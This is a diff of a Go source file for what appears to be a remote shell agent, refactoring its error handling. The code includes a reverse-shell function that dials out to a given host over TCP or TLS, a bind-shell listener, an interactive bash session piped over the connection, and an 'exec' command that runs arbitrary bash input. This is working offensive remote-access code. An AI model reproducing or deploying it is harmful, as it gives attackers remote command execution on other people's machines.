@@ -50,11 +50,9 @@ func bindShell(host string, port string) {
 		logger.Printf("[+] Accepting connection from %s\n", conn.RemoteAddr().String())
 		go runAgent(conn)
 	}
-
 }
 
 func reverseShell(host string, port string, ssltls bool) {
-
 	address := fmt.Sprintf("%s:%s", host, port)
 	logger.Println("[+] Address ", address)
 
@@ -67,7 +65,6 @@ func reverseShell(host string, port string, ssltls bool) {
 		}
 		conn, err = tls.Dial("tcp", address, config)
 	} else {
-
 		conn, err = net.Dial("tcp", address)
 	}
 	if err != nil {
@@ -80,7 +77,10 @@ func reverseShell(host string, port string, ssltls bool) {
 
 func runAgent(conn ConnInterface) {
 	for {
-		conn.Write([]byte("$> "))
+		_, err := conn.Write([]byte("$> "))
+		if err != nil {
+			logger.Printf("Error Writin \"$> \" : %s\n", err)
+		}
 
 		input := make([]byte, 4096)
 		n, _ := conn.Read(input)
@@ -94,29 +94,37 @@ func runAgent(conn ConnInterface) {
 		case "help":
 			displayHelp(conn)
 		case "shell":
-			conn.Write([]byte("[+] Run shell command\n"))
+			_, err := conn.Write([]byte("[+] Run shell command\n"))
+			if err != nil {
+				logger.Printf("Error Writin \"[+] Run shell command\" : %s\n", err)
+			}
 			runShell(conn)
-			break
 		case "exit":
-			conn.Write([]byte("Exiting this agent\n"))
+			_, err := conn.Write([]byte("Exiting this agent\n"))
+			if err != nil {
+				logger.Printf("Error Writin \"Exiting the agent\" : %s\n", err)
+			}
+
 			conn.Close()
-			break
 		default:
 			if strings.HasPrefix(command, "exec") {
 				runCommand(conn, command[len("exec "):])
-				break
 			}
-			conn.Write([]byte("Unknow commad\n"))
+
+			_, err := conn.Write([]byte("Unknow commad\n"))
+			if err != nil {
+				logger.Printf("Error Writin \"Unknow command\" : %s\n", err)
+			}
 		}
 	}
 }
 
 func displayHelp(conn ConnInterface) {
-	conn.Write([]byte("[+] Help\n"))
-	conn.Write([]byte("\t- help\tDisplay this help\n"))
-	conn.Write([]byte("\t- shell\tRun a shell\n"))
-	conn.Write([]byte("\t- exec\texecute command given in parameters\n"))
-	conn.Write([]byte("\t- exit\texit\n"))
+	_, _ = conn.Write([]byte("[+] Help\n"))
+	_, _ = conn.Write([]byte("\t- help\tDisplay this help\n"))
+	_, _ = conn.Write([]byte("\t- shell\tRun a shell\n"))
+	_, _ = conn.Write([]byte("\t- exec\texecute command given in parameters\n"))
+	_, _ = conn.Write([]byte("\t- exit\texit\n"))
 }
 
 func runCommand(conn ConnInterface, input string) {
@@ -128,11 +136,16 @@ func runCommand(conn ConnInterface, input string) {
 	} else {
 		out, err = exec.Command("/bin/bash", "-c", input).Output()
 	}
+
 	if err != nil {
-		conn.Write([]byte("[!] Erreur running command\n"))
+		_, _ = conn.Write([]byte("[!] Erreur running command\n"))
 		return
 	}
-	conn.Write([]byte(out))
+
+	_, err = conn.Write([]byte(out))
+	if err != nil {
+		logger.Printf("Error writing bytes : %s\n", err)
+	}
 }
 
 func runShell(conn ConnInterface) {
@@ -140,7 +153,12 @@ func runShell(conn ConnInterface) {
 
 	cmd := exec.Command("/bin/bash", "-i")
 
-	go io.Copy(conn, r)
+	go func() {
+		_, err := io.Copy(conn, r)
+		if err != nil {
+			logger.Printf("Error during io.Copy : %s\n", err)
+		}
+	}()
 
 	// Get System information
 	hostname, _ := exec.Command("hostname").Output()
